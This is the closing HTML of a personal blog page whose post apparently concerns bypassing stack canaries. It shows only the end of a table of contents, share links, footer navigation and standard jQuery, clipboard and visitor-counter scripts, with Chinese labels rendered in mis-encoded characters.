class="toc-text">å…­ã€ä¿®æ”¹TSLç»•è¿‡canary</span></a></li></ol></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://yubut.github.io/2023/09/01/Canary%E8%A7%A3%E5%86%B3%E5%A7%BF%E5%8A%BF/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://yubut.github.io/2023/09/01/Canary%E8%A7%A3%E5%86%B3%E5%A7%BF%E5%8A%BF/&text=Canaryè§£å†³å§¿åŠ¿"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://yubut.github.io/2023/09/01/Canary%E8%A7%A3%E5%86%B3%E5%A7%BF%E5%8A%BF/&title=Canaryè§£å†³å§¿åŠ¿"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://yubut.github.io/2023/09/01/Canary%E8%A7%A3%E5%86%B3%E5%A7%BF%E5%8A%BF/&is_video=false&description=Canaryè§£å†³å§¿åŠ¿"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Canaryè§£å†³å§¿åŠ¿&body=Check out this article: https://yubut.github.io/2023/09/01/Canary%E8%A7%A3%E5%86%B3%E5%A7%BF%E5%8A%BF/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://yubut.github.io/2023/09/01/Canary%E8%A7%A3%E5%86%B3%E5%A7%BF%E5%8A%BF/&title=Canaryè§£å†³å§¿åŠ¿"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://yubut.github.io/2023/09/01/Canary%E8%A7%A3%E5%86%B3%E5%A7%BF%E5%8A%BF/&title=Canaryè§£å†³å§¿åŠ¿"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://yubut.github.io/2023/09/01/Canary%E8%A7%A3%E5%86%B3%E5%A7%BF%E5%8A%BF/&title=Canaryè§£å†³å§¿åŠ¿"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://yubut.github.io/2023/09/01/Canary%E8%A7%A3%E5%86%B3%E5%A7%BF%E5%8A%BF/&title=Canaryè§£å†³å§¿åŠ¿"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://yubut.github.io/2023/09/01/Canary%E8%A7%A3%E5%86%B3%E5%A7%BF%E5%8A%BF/&name=Canaryè§£å†³å§¿åŠ¿&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://yubut.github.io/2023/09/01/Canary%E8%A7%A3%E5%86%B3%E5%A7%BF%E5%8A%BF/&t=Canaryè§£å†³å§¿åŠ¿"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> èœå•</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> ç›®å½•</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> åˆ†äº«</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> è¿”å›é¡¶éƒ¨</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
    <div class="footer-left">
        Copyright Â©
        
        
        2023-2024
        yub
        <br>
        <!-- åˆ é™¤å¤‡æ¡ˆä¿¡æ¯ï¼Œå¦‚æœä¸éœ€è¦å¤‡æ¡ˆå¯ä»¥çœç•¥ä»¥ä¸‹è¡Œ -->
        <!-- <a href="https://beian.miit.gov.cn/" target="_blank">xICPå¤‡xxxxxxxxå·-x</a> -->
    </div>

    <div class="footer-right">
        <nav>
            <ul>
                
                <li><a href="/">Home</a></li>
                
                <li><a href="/about/">About</a></li>
                
                <li><a href="/archives/">Articles</a></li>
                
                <li><a href="/categories/">Categories</a></li>
                
                <li><a href="/links/">Links</a></li>
                
                <li><a href="/tags/">Tags</a></li>
                
                <li><a href="/search/">Search</a></li>
                
            </ul>
            
            <ul>
                <span id="busuanzi_container_site_pv">
                    æœ¬ç«™æ€»è®¿é—®é‡<span id="busuanzi_value_site_pv"></span>æ¬¡
                </span>
                <span class="post-meta-divider">|</span>
                <span id="busuanzi_container_site_uv" style='display:none'>
                    æœ¬ç«™è®¿å®¢æ•°<span id="busuanzi_value_site_uv"></span>äºº
                </span>
                <!-- å¼•å…¥ä¸è’œå­è„šæœ¬ -->
                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            </ul>
            
        </nav>
    </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"å¤åˆ¶åˆ°ç²˜è´´æ¿ï¼\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "å¤åˆ¶æˆåŠŸï¼");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
